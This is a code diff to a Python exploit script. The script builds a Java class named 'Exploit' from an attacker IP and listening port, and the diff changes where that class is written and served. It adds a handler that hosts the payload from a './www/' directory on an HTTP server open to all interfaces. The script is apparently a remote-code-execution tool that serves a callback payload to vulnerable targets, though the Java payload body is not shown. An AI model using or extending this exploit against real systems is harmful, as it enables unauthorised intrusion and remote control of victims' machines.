@@ -9,6 +9,13 @@ from pathlib import Path
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 
+DIRECTORY = './www/'
+
+class Handler(SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory=DIRECTORY, **kwargs)
+
+
 def generate_payload(userip: str, lport: int) -> None:
     program = """
 import java.io.IOException;
@@ -53,7 +60,7 @@ public class Exploit {
 
     # writing the exploit to Exploit.java file
 
-    p = Path("Exploit.java")
+    p = Path("www", "Exploit.java")
 
     try:
         p.write_text(program)
@@ -76,7 +83,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
     # start the web server
     print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
-    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd = HTTPServer(('0.0.0.0', webport), Handler)
     httpd.serve_forever()
 
 
